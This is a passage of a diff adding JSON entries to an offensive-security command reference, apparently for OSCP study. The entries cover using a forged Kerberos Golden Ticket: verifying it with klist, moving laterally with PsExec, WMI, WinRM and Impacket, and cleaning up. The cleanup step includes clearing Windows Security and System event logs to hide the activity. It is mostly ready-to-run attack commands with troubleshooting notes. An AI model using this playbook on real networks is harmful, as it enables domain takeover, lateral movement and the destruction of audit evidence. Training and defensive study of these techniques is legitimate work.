+      "notes": "ALWAYS verify ticket injection with klist before attempting lateral movement. This confirms: (1) Ticket was successfully created and injected, (2) Correct domain and realm, (3) Valid encryption and ticket flags, (4) Ticket hasn't expired. Key indicators of Golden Ticket: (1) Server: krbtgt/<domain> (it's a TGT, not service ticket), (2) Extremely long validity period (default 10 years), (3) Client name matches your /user parameter. EXAM TIP: If klist shows no tickets but Mimikatz said 'successfully submitted', you may need to open a new command prompt with 'mimikatz # misc::cmd' to inherit the ticket. Time estimate: Instant (<1 second).\n\nMANUAL ALTERNATIVES:\nMimikatz alternative:\nmimikatz # kerberos::list\n\nRubeus alternative:\nRubeus.exe klist\n\nPowerShell (requires admin):\nGet-WinEvent -LogName Security -FilterXPath \"*[System[EventID=4768]]\" | Select TimeCreated, Message\n\nDetailed ticket analysis:\nklist -li 0x3e7 (SYSTEM session)\nklist sessions (all sessions, requires admin)\n\nTIME ESTIMATE: < 5 seconds"
+    },
+    {
+      "id": "ad-golden-ticket-psexec-use",
+      "name": "Use Golden Ticket for Lateral Movement (PsExec)",
+      "category": "lateral-movement",
+      "subcategory": "active-directory",
+      "command": "PsExec.exe \\\\<TARGET_FQDN> cmd.exe",
+      "description": "Leverage Golden Ticket for lateral movement to remote systems using PsExec. The forged TGT provides domain-wide administrative access, allowing command execution on any domain system.",
+      "variables": [
+        {
+          "name": "<TARGET_FQDN>",
+          "description": "Fully Qualified Domain Name of target system (e.g., DC1.corp.com, WEB01.corp.com). CRITICAL: Use FQDN/hostname, NOT IP address. IP forces NTLM authentication; FQDN uses Kerberos.",
+          "example": "DC1",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "PsExec.exe": "Sysinternals tool for executing commands on remote Windows systems via SMB. When provided with a FQDN/hostname, PsExec uses Kerberos authentication. It will automatically use any cached Kerberos tickets (like our Golden Ticket) for authentication. CRITICAL: Use hostname/FQDN (\\\\DC1), not IP (\\\\192.168.50.70). IPs force NTLM authentication which bypasses Kerberos.",
+        "\\\\<TARGET_FQDN>": "UNC path to target system using hostname. Format: \\\\HOSTNAME or \\\\HOSTNAME.DOMAIN.COM. Windows networking automatically selects Kerberos when FQDN is used. WHY: Kerberos requires Service Principal Names (SPNs) which are based on hostnames, not IPs. Using IP forces fallback to NTLM authentication.",
+        "cmd.exe": "Command to execute on remote system. PsExec launches this in an interactive shell with SYSTEM privileges by default. Alternatives: powershell.exe (interactive PowerShell), whoami /groups (verify group memberships), ipconfig (verify you're on target).",
+        "Default behavior": "PsExec uses current session's credentials. With Golden Ticket injected, this means domain-administrative access via forged Kerberos ticket. PsExec doesn't know the ticket is forged - it's valid Kerberos authentication."
+      },
+      "success_indicators": [
+        "Output: 'PsExec v2.4 - Execute processes remotely'",
+        "Output: 'Copyright (C) 2001-2022 Mark Russinovich'",
+        "New command prompt opens showing target system",
+        "Prompt shows: 'C:\\Windows\\system32>'",
+        "Commands execute on remote system (verify with: hostname, ipconfig)",
+        "whoami shows domain\\username (your impersonated account)",
+        "whoami /groups shows Domain Admins, Enterprise Admins membership"
+      ],
+      "failure_indicators": [
+        "Couldn't access <TARGET>:",
+        "Access is denied.",
+        "The network path was not found",
+        "The user name or password is incorrect",
+        "There are currently no logon servers available to service the logon request"
+      ],
+      "troubleshooting": {
+        "Access is denied": "Golden Ticket not injected, expired, or you're using IP address instead of hostname. Solution: (1) Verify ticket with klist - ensure 'Server: krbtgt/<domain>' is present. (2) Use hostname/FQDN, not IP: PsExec.exe \\\\DC1 cmd.exe (correct) vs PsExec.exe \\\\192.168.50.70 cmd.exe (incorrect - forces NTLM). (3) Recreate ticket if expired.",
+        "The network path was not found": "DNS resolution failure or target is offline. Solution: Verify target hostname resolves: nslookup <TARGET_FQDN>. Verify target is reachable: ping <TARGET_FQDN>. Check spelling of hostname. If DNS fails, add to hosts file: echo <IP> <FQDN> >> C:\\Windows\\System32\\drivers\\etc\\hosts",
+        "The user name or password is incorrect": "Ticket is invalid or corrupted. Solution: Verify krbtgt hash and domain SID are correct. Common mistake: Using wrong domain's krbtgt hash. Purge tickets (klist purge) and recreate Golden Ticket with verified parameters.",
+        "No logon servers available": "Domain controller unreachable. Solution: Verify DC connectivity: nltest /dsgetdc:<domain>. Check network path to DC: ping <DC_FQDN>. If DC is down, Kerberos authentication fails. Verify firewall rules allow Kerberos (TCP/UDP 88).",
+        "PsExec is not recognized": "PsExec not in PATH. Solution: Download Sysinternals Suite, extract PsExec64.exe. Use full path: C:\\Tools\\SysinternalsSuite\\PsExec64.exe \\\\<TARGET> cmd.exe. Alternative: Copy PsExec to current directory.",
+        "Couldn't access <target> (using hostname, ticket valid)": "Firewall blocking SMB (TCP 445). Solution: Verify SMB connectivity: Test-NetConnection <TARGET> -Port 445 (PowerShell). If blocked, try alternative lateral movement: WMI (wmic), WinRM (Enter-PSSession), RDP (mstsc)."
+      },
+      "prerequisites": [
+        "ad-golden-ticket-mimikatz-create",
+        "ad-golden-ticket-verify-klist"
+      ],
+      "next_steps": [
+        "windows-whoami-groups-verify",
+        "windows-net-user-enumerate",
+        "ad-dcsync-mimikatz-all-users"
+      ],
+      "alternatives": [
+        "windows-wmic-remote-exec",
+        "windows-winrm-pssession",
+        "windows-smbexec-impacket"
+      ],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "LATERAL_MOVEMENT",
+        "GOLDEN_TICKET",
+        "KERBEROS",
+        "PSEXEC",
+        "PERSISTENCE",
+        "DOMAIN_DOMINANCE",
+        "OSCP:HIGH",
+        "WINDOWS"
+      ],
+      "oscp_relevance": "high",
+      "notes": "This is the PAYOFF of the Golden Ticket attack - domain-wide administrative access. The forged TGT grants permissions to ANY system in the domain. You're not limited to PsExec - ANY Kerberos-aware tool will work: WMI (wmic), WinRM (Enter-PSSession), RDP (mstsc), SMB file access (dir \\\\DC1\\C$). CRITICAL EXAM TIP: ALWAYS use hostnames/FQDNs with Golden Tickets. Using IP addresses forces NTLM authentication and bypasses your forged Kerberos ticket, causing 'Access Denied'. This is the #1 mistake when using Golden Tickets. Time estimate: 5-10 seconds for PsExec connection establishment.\n\nMANUAL ALTERNATIVES:\nAlternative lateral movement methods with Golden Ticket:\n\n1. WMI:\nwmic /node:<TARGET_FQDN> process call create \"cmd.exe /c <command>\"\n\n2. WinRM (PowerShell):\nEnter-PSSession -ComputerName <TARGET_FQDN>\n\n3. Direct SMB access:\ndir \\\\<TARGET_FQDN>\\C$\ncopy file.txt \\\\<TARGET_FQDN>\\C$\\Temp\\\n\n4. RDP:\nmstsc /v:<TARGET_FQDN>\n\n5. Impacket (Linux):\nexport KRB5CCNAME=ticket.ccache\npsexec.py <DOMAIN>/<USER>@<TARGET_FQDN> -k -no-pass\n\n6. Scheduled task:\nschtasks /create /tn \"Update\" /tr \"cmd.exe /c <command>\" /sc once /st 00:00 /S <TARGET_FQDN>\n\nTIME ESTIMATE: 10-20 seconds (connection + authentication)"
+    },
+    {
+      "id": "ad-golden-ticket-cleanup",
+      "name": "Remove Golden Ticket (Cleanup)",
+      "category": "post-exploit",
+      "subcategory": "active-directory",
+      "command": "mimikatz # kerberos::purge",
+      "description": "Remove Golden Ticket from memory by purging all Kerberos tickets. Essential for OPSEC and cleanup after completing objectives. Removes forensic evidence from ticket cache.",
+      "variables": [],
+      "flag_explanations": {
+        "kerberos::purge": "Deletes all Kerberos tickets from current session, including forged Golden Tickets. Same command as pre-injection ticket purge, but used here for cleanup. After purging, re-authenticate to domain resources with legitimate credentials to restore normal operation. WHY: Removes forged ticket from system, reducing forensic footprint. Ticket cache is logged in Windows Event Logs (Event ID 4768/4769), so cleanup is important for OPSEC."
+      },
+      "success_indicators": [
+        "Output: 'Ticket(s) purge for current session is OK'",
+        "klist shows: 'No credentials cached' or 'Cached Tickets: (0)'",
+        "Next domain authentication uses legitimate credentials (generates new TGT)"
+      ],
+      "failure_indicators": [
+        "ERROR kuhl_m_kerberos_purge",
+        "Access is denied"
+      ],
+      "troubleshooting": {
+        "Access is denied": "Insufficient privileges. Solution: Should work for standard users on their own session. If failing, run as Administrator.",
+        "Tickets reappear after purge": "Normal behavior if actively authenticated. Solution: Close SMB connections: net use * /delete. Tickets will regenerate when accessing domain resources."
+      },
+      "prerequisites": [],
+      "next_steps": [
+        "windows-event-log-clear",
+        "windows-history-clear"
+      ],
+      "alternatives": [
+        "kerberos-klist-purge"
+      ],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "KERBEROS",
+        "GOLDEN_TICKET",
+        "CLEANUP",
+        "OPSEC",
+        "FORENSICS",
+        "OSCP:MEDIUM",
+        "WINDOWS"
+      ],
+      "oscp_relevance": "medium",
+      "notes": "OPSEC consideration: Purging tickets removes the forged Golden Ticket from memory but doesn't erase all traces. Windows Event Logs (Event IDs 4768, 4769, 4770) record Kerberos ticket operations. For complete cleanup: (1) Purge tickets, (2) Clear relevant event logs (if you have admin rights), (3) Close any SMB/RPC connections to domain resources. EXAM NOTE: In OSCP, cleanup is less critical (not a red team engagement), but understanding cleanup demonstrates operational maturity. Time estimate: Instant (<1 second).\n\nMANUAL ALTERNATIVES:\nNative Windows:\nklist purge\n\nComplete cleanup:\nklist purge && net use * /delete /y\n\nEvent log cleanup (requires admin):\nwevtutil cl Security\nwevtutil cl System\n\nAlternative: Reboot (clears all tickets):\nshutdown /r /t 0\n\nTIME ESTIMATE: < 5 seconds (purge only), 1-2 minutes (including log cleanup)"
+    }
+  ]
+}
